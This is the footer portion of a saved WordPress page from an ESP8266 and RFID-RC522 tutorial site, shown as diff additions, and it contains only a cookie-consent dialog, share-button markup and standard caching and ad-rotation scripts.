href="https://www.addtoany.com/share#url=http%3A%2F%2Fwww.esp8266learning.com%2Fesp8266-rfid-rc522-module-example.php&amp;title=ESP8266%20and%20RFID-RC522%20module%20example%20-%20esp8266%20learning"><span class="a2a_svg a2a_s__default a2a_s_a2a" style="background-color: rgb(1, 102, 255);"><svg focusable="false" aria-hidden="true" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span><span class="a2a_label a2a_localize" data-a2a-localize="inner,Share">Share</span></a></div></aside>            </div>
+
+        </div>
+    </div>
+</div>
+	<!-- Sub Footer -->
+	
+
+</div><!--close td-outer-wrap-->
+
+
+<!--googleoff: all--><div id="cookie-law-info-bar" data-nosnippet="true" data-cli-style="cli-style-v2" data-cli-type="popup" style="background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); font-family: inherit; position: fixed; display: none; width: 500px; height: auto; max-height: 702px; top: 50%; left: 50%; margin-left: -250px; margin-top: -108.5px; overflow: auto;" class="cli-bar-popup cli-modal-content"><span><div class="cli-bar-container cli-style-v2"><div class="cli-bar-message">We use cookies on our website to give you the most relevant experience by remembering your preferences and repeat visits. By clicking “Accept All”, you consent to the use of ALL the cookies. However, you may visit "Cookie Settings" to provide a controlled consent. For more information, visit our <a href="http://www.esp8266learning.com/privacy-policy">Privacy Policy</a>.</div><div class="cli-bar-btn_container"><a role="button" class="medium cli-plugin-button cli-plugin-main-button cli_settings_button" style="margin: 0px 5px 0px 0px; color: rgb(51, 51, 51); background-color: rgb(222, 223, 224);">Cookie Settings</a><a id="wt-cli-accept-all-btn" role="button" data-cli_action="accept_all" class="wt-cli-element medium cli-plugin-button wt-cli-accept-all-btn cookie_action_close_header cli_action_button" style="color: rgb(255, 255, 255); background-color: rgb(97, 162, 41);">Accept All</a></div></div></span></div><div id="cookie-law-info-again" data-nosnippet="true" style="background-color: rgb(255, 255, 255); color: rgb(51, 51, 51); position: fixed; font-family: inherit; width: auto; right: 100px; bottom: 0px; display: none;"><span id="cookie_hdr_showagain">Manage consent</span></div><div class="cli-modal" data-nosnippet="true" id="cliSettingsPopup" tabindex="-1" role="dialog" aria-labelledby="cliSettingsPopup" aria-hidden="true">
+  <div class="cli-modal-dialog" role="document">
+	<div class="cli-modal-content cli-bar-popup">
+		  <button type="button" class="cli-modal-close" id="cliModalClose">
+			<svg class="" viewBox="0 0 24 24"><path d="M19 6.41l-1.41-1.41-5.59 5.59-5.59-5.59-1.41 1.41 5.59 5.59-5.59 5.59 1.41 1.41 5.59-5.59 5.59 5.59 1.41-1.41-5.59-5.59z"></path><path d="M0 0h24v24h-24z" fill="none"></path></svg>
+			<span class="wt-cli-sr-only">Close</span>
+		  </button>
+		  <div class="cli-modal-body">
+			<div class="cli-container-fluid cli-tab-container">
+	<div class="cli-row">
+		<div class="cli-col-12 cli-align-items-stretch cli-px-0">
+			<div class="cli-privacy-overview">
+				<h4>Privacy Overview</h4>				<div class="cli-privacy-content">
+					<div class="cli-privacy-content-text">This website uses cookies to improve your experience while you navigate through the website. Out of these, the cookies that are categorized as necessary are stored on your browser as they are essential for the working of basic functionalities of the ...</div>
+				</div>
+				<a class="cli-privacy-readmore" aria-label="Show more" role="button" data-readmore-text="Show more" data-readless-text="Show less"></a>			</div>
+		</div>
+		<div class="cli-col-12 cli-align-items-stretch cli-px-0 cli-tab-section-container">
+												<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="necessary" data-toggle="cli-toggle-tab">
+								Necessary							</a>
+															<div class="wt-cli-necessary-checkbox">
+									<input type="checkbox" class="cli-user-preference-checkbox" id="wt-cli-checkbox-necessary" data-id="checkbox-necessary" checked="checked">
+									<label class="form-check-label" for="wt-cli-checkbox-necessary">Necessary</label>
+								</div>
+								<span class="cli-necessary-caption">Always Enabled</span>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="necessary">
+								<div class="wt-cli-cookie-description">
+									Necessary cookies are absolutely essential for the website to function properly. These cookies ensure basic functionalities and security features of the website, anonymously.
+<table class="cookielawinfo-row-cat-table cookielawinfo-winter"><thead><tr><th class="cookielawinfo-column-1">Cookie</th><th class="cookielawinfo-column-3">Duration</th><th class="cookielawinfo-column-4">Description</th></tr></thead><tbody><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">cookielawinfo-checkbox-analytics</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Analytics".</td></tr><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">cookielawinfo-checkbox-functional</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">The cookie is set by GDPR cookie consent to record the user consent for the cookies in the category "Functional".</td></tr><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">cookielawinfo-checkbox-necessary</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">This cookie is set by GDPR Cookie Consent plugin. The cookies is used to store the user consent for the cookies in the category "Necessary".</td></tr><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">cookielawinfo-checkbox-others</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Other.</td></tr><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">cookielawinfo-checkbox-performance</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">This cookie is set by GDPR Cookie Consent plugin. The cookie is used to store the user consent for the cookies in the category "Performance".</td></tr><tr class="cookielawinfo-row"><td class="cookielawinfo-column-1">viewed_cookie_policy</td><td class="cookielawinfo-column-3">11 months</td><td class="cookielawinfo-column-4">The cookie is set by the GDPR Cookie Consent plugin and is used to store whether or not user has consented to the use of cookies. It does not store any personal data.</td></tr></tbody></table>								</div>
+							</div>
+						</div>
+					</div>
+																	<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="functional" data-toggle="cli-toggle-tab">
+								Functional							</a>
+															<div class="cli-switch">
+									<input type="checkbox" id="wt-cli-checkbox-functional" class="cli-user-preference-checkbox" data-id="checkbox-functional">
+									<label for="wt-cli-checkbox-functional" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">Functional</span></label>
+								</div>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="functional">
+								<div class="wt-cli-cookie-description">
+									Functional cookies help to perform certain functionalities like sharing the content of the website on social media platforms, collect feedbacks, and other third-party features.
+								</div>
+							</div>
+						</div>
+					</div>
+																	<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="performance" data-toggle="cli-toggle-tab">
+								Performance							</a>
+															<div class="cli-switch">
+									<input type="checkbox" id="wt-cli-checkbox-performance" class="cli-user-preference-checkbox" data-id="checkbox-performance">
+									<label for="wt-cli-checkbox-performance" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">Performance</span></label>
+								</div>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="performance">
+								<div class="wt-cli-cookie-description">
+									Performance cookies are used to understand and analyze the key performance indexes of the website which helps in delivering a better user experience for the visitors.
+								</div>
+							</div>
+						</div>
+					</div>
+																	<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="analytics" data-toggle="cli-toggle-tab">
+								Analytics							</a>
+															<div class="cli-switch">
+									<input type="checkbox" id="wt-cli-checkbox-analytics" class="cli-user-preference-checkbox" data-id="checkbox-analytics">
+									<label for="wt-cli-checkbox-analytics" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">Analytics</span></label>
+								</div>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="analytics">
+								<div class="wt-cli-cookie-description">
+									Analytical cookies are used to understand how visitors interact with the website. These cookies help provide information on metrics the number of visitors, bounce rate, traffic source, etc.
+								</div>
+							</div>
+						</div>
+					</div>
+																	<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="advertisement" data-toggle="cli-toggle-tab">
+								Advertisement							</a>
+															<div class="cli-switch">
+									<input type="checkbox" id="wt-cli-checkbox-advertisement" class="cli-user-preference-checkbox" data-id="checkbox-advertisement">
+									<label for="wt-cli-checkbox-advertisement" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">Advertisement</span></label>
+								</div>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="advertisement">
+								<div class="wt-cli-cookie-description">
+									Advertisement cookies are used to provide visitors with relevant ads and marketing campaigns. These cookies track visitors across websites and collect information to provide customized ads.
+								</div>
+							</div>
+						</div>
+					</div>
+																	<div class="cli-tab-section">
+						<div class="cli-tab-header">
+							<a role="button" tabindex="0" class="cli-nav-link cli-settings-mobile" data-target="others" data-toggle="cli-toggle-tab">
+								Others							</a>
+															<div class="cli-switch">
+									<input type="checkbox" id="wt-cli-checkbox-others" class="cli-user-preference-checkbox" data-id="checkbox-others">
+									<label for="wt-cli-checkbox-others" class="cli-slider" data-cli-enable="Enabled" data-cli-disable="Disabled"><span class="wt-cli-sr-only">Others</span></label>
+								</div>
+													</div>
+						<div class="cli-tab-content">
+							<div class="cli-tab-pane cli-fade" data-id="others">
+								<div class="wt-cli-cookie-description">
+									Other uncategorized cookies are those that are being analyzed and have not been classified into a category as yet.
+								</div>
+							</div>
+						</div>
+					</div>
+										</div>
+	</div>
+</div>
+		  </div>
+		  <div class="cli-modal-footer">
+			<div class="wt-cli-element cli-container-fluid cli-tab-container">
+				<div class="cli-row">
+					<div class="cli-col-12 cli-align-items-stretch cli-px-0">
+						<div class="cli-tab-footer wt-cli-privacy-overview-actions">
+						
+															<a id="wt-cli-privacy-save-btn" role="button" tabindex="0" data-cli-action="accept" class="wt-cli-privacy-btn cli_setting_save_button wt-cli-privacy-accept-btn cli-btn">SAVE &amp; ACCEPT</a>
+													</div>
+						
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+  </div>
+</div>
+<div class="cli-modal-backdrop cli-fade cli-settings-overlay"></div>
+<div class="cli-modal-backdrop cli-fade cli-popupbar-overlay"></div>
+<!--googleon: all-->
+
+    <!--
+
+        Theme: Newspaper by tagDiv.com 2019
+        Version: 9.7.3 (rara)
+        Deploy mode: deploy
+        Speed booster: v4.9.3
+
+        uid: 6553840ccaf90
+    -->
+
+    <link rel="stylesheet" id="cookie-law-info-table-css" href="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/cookie-law-info-table.css" type="text/css" media="all"><div style="position: static;"><div class="a2a_overlay" id="a2a_overlay"></div><div id="a2a_modal" class="a2a_modal a2a_hide" role="dialog" tabindex="-1" aria-label=""><div class="a2a_modal_body a2a_menu a2a_hide" id="a2a_copy_link"><span id="a2a_copy_link_icon" class="a2a_svg a2a_s_link a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><path fill="#FFF" d="M7.591 21.177c0-.36.126-.665.377-.917l2.804-2.804a1.235 1.235 0 0 1 .913-.378c.377 0 .7.144.97.43-.026.028-.11.11-.255.25-.144.14-.24.236-.29.29a2.82 2.82 0 0 0-.2.256 1.056 1.056 0 0 0-.177.344 1.43 1.43 0 0 0-.046.37c0 .36.126.666.377.918a1.25 1.25 0 0 0 .918.377c.126.001.251-.015.373-.047.125-.037.242-.096.345-.175.09-.06.176-.127.256-.2.1-.094.196-.19.29-.29.14-.142.223-.23.25-.254.297.28.445.607.445.984 0 .36-.126.664-.377.916l-2.778 2.79a1.242 1.242 0 0 1-.917.364c-.36 0-.665-.118-.917-.35l-1.982-1.97a1.223 1.223 0 0 1-.378-.9l-.001-.004Zm9.477-9.504c0-.36.126-.665.377-.917l2.777-2.79a1.235 1.235 0 0 1 .913-.378c.35 0 .656.12.917.364l1.984 1.968c.254.252.38.553.38.903 0 .36-.126.665-.38.917l-2.802 2.804a1.238 1.238 0 0 1-.916.364c-.377 0-.7-.14-.97-.418.026-.027.11-.11.255-.25a7.5 7.5 0 0 0 .29-.29c.072-.08.139-.166.2-.255.08-.103.14-.22.176-.344.032-.12.048-.245.047-.37 0-.36-.126-.662-.377-.914a1.247 1.247 0 0 0-.917-.377c-.136 0-.26.015-.37.046-.114.03-.23.09-.346.175a3.868 3.868 0 0 0-.256.2c-.054.05-.15.148-.29.29-.14.146-.222.23-.25.258-.294-.278-.442-.606-.442-.983v-.003ZM5.003 21.177c0 1.078.382 1.99 1.146 2.736l1.982 1.968c.745.75 1.658 1.12 2.736 1.12 1.087 0 2.004-.38 2.75-1.143l2.777-2.79c.75-.747 1.12-1.66 1.12-2.737 0-1.106-.392-2.046-1.183-2.818l1.186-1.185c.774.79 1.708 1.186 2.805 1.186 1.078 0 1.995-.376 2.75-1.13l2.803-2.81c.751-.754 1.128-1.671 1.128-2.748 0-1.08-.382-1.993-1.146-2.738L23.875 6.12C23.13 5.372 22.218 5 21.139 5c-1.087 0-2.004.382-2.75 1.146l-2.777 2.79c-.75.747-1.12 1.66-1.12 2.737 0 1.105.392 2.045 1.183 2.817l-1.186 1.186c-.774-.79-1.708-1.186-2.805-1.186-1.078 0-1.995.377-2.75 1.132L6.13 18.426c-.754.755-1.13 1.672-1.13 2.75l.003.001Z"></path></svg></span><input id="a2a_copy_link_text" type="text" title="Copy link" readonly=""><div id="a2a_copy_link_copied">✓</div></div><div class="a2a_modal_body a2a_menu a2a_thanks a2a_hide" id="a2a_thanks"><div class="a2a_localize" data-a2a-localize="inner,ThanksForSharing">Thanks for sharing!</div></div></div><div class="a2a_menu a2a_full a2a_localize" id="a2apage_full" role="dialog" tabindex="-1" aria-label="Share" data-a2a-localize="title,Share"><div class="a2a_full_header"><div id="a2apage_find_container" class="a2a_menu_find_container"><input id="a2apage_find" class="a2a_menu_find a2a_localize" type="text" autocomplete="off" title="Instantly find any service to add to" data-a2a-localize="title,FindAnyServiceToAddTo"><span id="a2apage_find_icon" class="a2a_svg a2a_s_find"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#CCC" d="M19.7 18.2l-4.5-4.5c.7-1.1 1.2-2.3 1.2-3.6 0-3.5-2.8-6.3-6.3-6.3s-6.3 2.8-6.3 6.3 2.8 6.3 6.3 6.3c1.4 0 2.6-.4 3.6-1.2l4.5 4.5c.6.6 1.3.7 1.7.2.5-.4.4-1.1-.2-1.7zm-9.6-3.6c-2.5 0-4.5-2.1-4.5-4.5 0-2.5 2.1-4.5 4.5-4.5 2.5 0 4.5 2.1 4.5 4.5s-2 4.5-4.5 4.5z"></path></svg></span></div></div><div class="a2a_full_services" id="a2apage_full_services" role="presentation"></div><div class="a2a_full_footer"><a href="https://www.addtoany.com/" title="Share Buttons" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span>AddToAny</a></div></div><div id="a2apage_dropdown" class="a2a_menu a2a_mini a2a_localize a2a_hide" tabindex="-1" aria-label="Share" data-a2a-localize="label,Share"><div class="a2a_mini_services" id="a2apage_mini_services"></div><div id="a2apage_cols_container" class="a2a_cols_container"><div class="a2a_col1" id="a2apage_col1"></div><div id="a2apage_2_col1" class="a2a_hide"></div><div class="a2a_clear"></div></div><div class="a2apage_wide a2a_wide"><a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#addtoany" id="a2apage_show_more_less" class="a2a_more a2a_localize" title="Show All" data-a2a-localize="title,ShowAll"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span><span class="a2a_localize" data-a2a-localize="inner,More">More…</span></a></div></div><div style="height: 1px; width: 1px; position: absolute; z-index: 100000; top: 0px; visibility: hidden;"><iframe id="a2a_sm_ifr" title="AddToAny Utility Frame" transparency="true" allowtransparency="true" frameborder="0" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/sm.24.html" style="height: 1px; width: 1px; border: 0px; left: 0px; top: 0px; position: absolute; z-index: 100000; display: none;"></iframe></div><div class="a2a_menu a2a_full a2a_localize" id="a2afeed_full" role="dialog" tabindex="-1" aria-label="Subscribe" data-a2a-localize="title,Subscribe"><div class="a2a_full_header"><div id="a2afeed_find_container" class="a2a_menu_find_container"><input id="a2afeed_find" class="a2a_menu_find a2a_localize" type="text" autocomplete="off" title="Instantly find any service to add to" data-a2a-localize="title,FindAnyServiceToAddTo"><span id="a2afeed_find_icon" class="a2a_svg a2a_s_find"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path fill="#CCC" d="M19.7 18.2l-4.5-4.5c.7-1.1 1.2-2.3 1.2-3.6 0-3.5-2.8-6.3-6.3-6.3s-6.3 2.8-6.3 6.3 2.8 6.3 6.3 6.3c1.4 0 2.6-.4 3.6-1.2l4.5 4.5c.6.6 1.3.7 1.7.2.5-.4.4-1.1-.2-1.7zm-9.6-3.6c-2.5 0-4.5-2.1-4.5-4.5 0-2.5 2.1-4.5 4.5-4.5 2.5 0 4.5 2.1 4.5 4.5s-2 4.5-4.5 4.5z"></path></svg></span></div></div><div class="a2a_full_services" id="a2afeed_full_services" role="presentation"></div><div class="a2a_full_footer"><a href="https://www.addtoany.com/" title="Share Buttons" rel="noopener" target="_blank"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span>AddToAny</a></div></div><div id="a2afeed_dropdown" class="a2a_menu a2a_mini a2a_localize a2a_hide" tabindex="-1" aria-label="Subscribe" data-a2a-localize="label,Subscribe"><div class="a2a_mini_services" id="a2afeed_mini_services"></div><div id="a2afeed_cols_container" class="a2a_cols_container"><div class="a2a_col1" id="a2afeed_col1"></div><div id="a2afeed_2_col1" class="a2a_hide"></div><div class="a2a_clear"></div></div><div class="a2afeed_wide a2a_wide"><a href="http://www.esp8266learning.com/esp8266-rfid-rc522-module-example.php#addtoany" id="a2afeed_show_more_less" class="a2a_more a2a_localize" title="Show All" data-a2a-localize="title,ShowAll"><span class="a2a_svg a2a_s__default a2a_s_a2a a2a_logo_color"><svg focusable="false" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 32 32"><g fill="#FFF"><path d="M14 7h4v18h-4z"></path><path d="M7 14h18v4H7z"></path></g></svg></span><span class="a2a_localize" data-a2a-localize="inner,More">More…</span></a></div></div></div>
+<script type="text/javascript" id="jshowoff-adrotate-js-extra">
+/* <![CDATA[ */
+var impression_object = {"ajax_url":"http:\/\/www.esp8266learning.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/jquery.adrotate.dyngroup.js.download" id="jshowoff-adrotate-js"></script>
+<script type="text/javascript" id="clicktrack-adrotate-js-extra">
+/* <![CDATA[ */
+var click_object = {"ajax_url":"http:\/\/www.esp8266learning.com\/wp-admin\/admin-ajax.php"};
+/* ]]> */
+</script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/jquery.adrotate.clicktracker.js.download" id="clicktrack-adrotate-js"></script>
+<script type="text/javascript" id="rocket-browser-checker-js-after">
+"use strict";var _createClass=function(){function defineProperties(target,props){for(var i=0;i<props.length;i++){var descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return _createClass(RocketBrowserCompatibilityChecker,[{key:"_checkPassiveOption",value:function(self){try{var options={get passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 in window&&(window.requestIdleCallback=function(cb){var start=Date.now();return setTimeout(function(){cb({didTimeout:!1,timeRemaining:function(){return Math.max(0,50-(Date.now()-start))}})},1)}),!1 in window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return elem.relList&&elem.relList.supports&&elem.relList.supports("prefetch")&&window.IntersectionObserver&&"isIntersecting"in IntersectionObserverEntry.prototype}},{key:"isSlowConnection",value:function(){return"connection"in navigator&&"effectiveType"in navigator.connection&&("2g"===navigator.connection.effectiveType||"slow-2g"===navigator.connection.effectiveType)}}]),RocketBrowserCompatibilityChecker}();
+</script>
+<script type="text/javascript" id="rocket-preload-links-js-extra">
+/* <![CDATA[ */
+var RocketPreloadLinksConfig = {"excludeUris":"\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index\\.php\/)?(.*)wp\\-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/","usesTrailingSlash":"","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm","siteUrl":"http:\/\/www.esp8266learning.com","onHoverDelay":"100","rateThrottle":"3"};
+/* ]]> */
+</script>
+<script type="text/javascript" id="rocket-preload-links-js-after">
+(function() {
+"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof RocketPreloadLinksConfig&&new n(new RocketBrowserCompatibilityChecker({capture:!0,passive:!0}),RocketPreloadLinksConfig).init()}}]),n}();t.run();
+}());
+</script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/tagdiv_theme.min.js.download" id="td-site-min-js"></script>
+<script type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/comment-reply.min.js.download" id="comment-reply-js"></script>
+<script defer="" type="text/javascript" src="./ESP8266 and RFID-RC522 module example - esp8266 learning_files/akismet-frontend.js.download" id="akismet-frontend-js"></script>
+
+<!-- JS generated by theme -->
+
+<script>
+    
+</script>
+
+<!-- AdRotate JS -->
+<script type="text/javascript">
+jQuery(document).ready(function(){
+if(jQuery.fn.gslider) {
+	jQuery('.g-1').gslider({ groupid: 1, speed: 12000 });
+}
+});
+</script>
+<!-- /AdRotate JS -->
+
+
+
+</body></html>
